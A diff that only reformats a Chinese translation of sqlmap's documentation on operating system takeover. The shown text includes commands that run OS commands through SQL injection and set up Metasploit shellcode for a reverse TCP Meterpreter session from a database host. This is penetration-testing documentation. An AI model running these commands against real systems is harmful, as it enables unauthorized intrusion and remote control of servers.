@@ -1,6 +1,6 @@
-## 接管操作系统
+# 接管操作系统
 
-### 运行任意操作系统命令
+## 运行任意操作系统命令
 
 选项和开关：`--os-cmd` 和 `--os-shell`
 
@@ -14,7 +14,7 @@
 
 针对 PostgreSQL 目标的示例：
 
-```
+```shell
 $ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --\
 os-cmd id -v 1
 
@@ -50,7 +50,7 @@ sqlmap 还支持模拟 shell 输入，你可以输入任意命令以执行。对
 * JSP
 * PHP
 
-###  有状态带外连接：Meterpreter & friends
+## 有状态带外连接：Meterpreter & friends
 
 开关和选项：`--os-pwn`，`--os-smbrelay`，`--os-bof`，`--priv-esc`，`--msf-path` 和 `--tmp-path`
 
@@ -67,7 +67,7 @@ sqlmap 依赖 Metasploit 创建 shellcode，并实现了四种不同的技术在
 
 针对 MySQL 目标的示例：
 
-```
+```shell
 $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?\
 id=1" --os-pwn --msf-path /software/metasploit
 
@@ -81,13 +81,13 @@ back-end DBMS: MySQL 5.0
 how do you want to establish the tunnel?
 [1] TCP: Metasploit Framework (default)
 [2] ICMP: icmpsh - ICMP tunneling
-> 
+>
 [hh:mm:32] [INFO] testing if current user is DBA
 [hh:mm:32] [INFO] fetching current user
 what is the back-end database management system architecture?
 [1] 32-bit (default)
 [2] 64-bit
-> 
+>
 [hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist
 [hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist
 [hh:mm:33] [INFO] detecting back-end DBMS version from its banner
@@ -98,22 +98,20 @@ how do you want to execute the Metasploit shellcode on the back-end database und
 erlying operating system?
 [1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
 [2] Stand-alone payload stager (file system way)
-> 
-[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode 
+>
+[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode
 which connection type do you want to use?
 [1] Reverse TCP: Connect back from the database host to this machine (default)
-[2] Reverse TCP: Try to connect back from the database host to this machine, on 
-all ports 
-between the specified and 65535
+[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535
 [3] Bind TCP: Listen on the database host for a connection
-> 
+>
 which is the local address? [192.168.136.1] 
 which local port number do you want to use? [60641] 
 which payload do you want to use?
 [1] Meterpreter (default)
 [2] Shell
 [3] VNC
-> 
+>
 [hh:mm:40] [INFO] creation in progress ... done
 [hh:mm:43] [INFO] running Metasploit Framework command line interface locally, p
 lease wait..
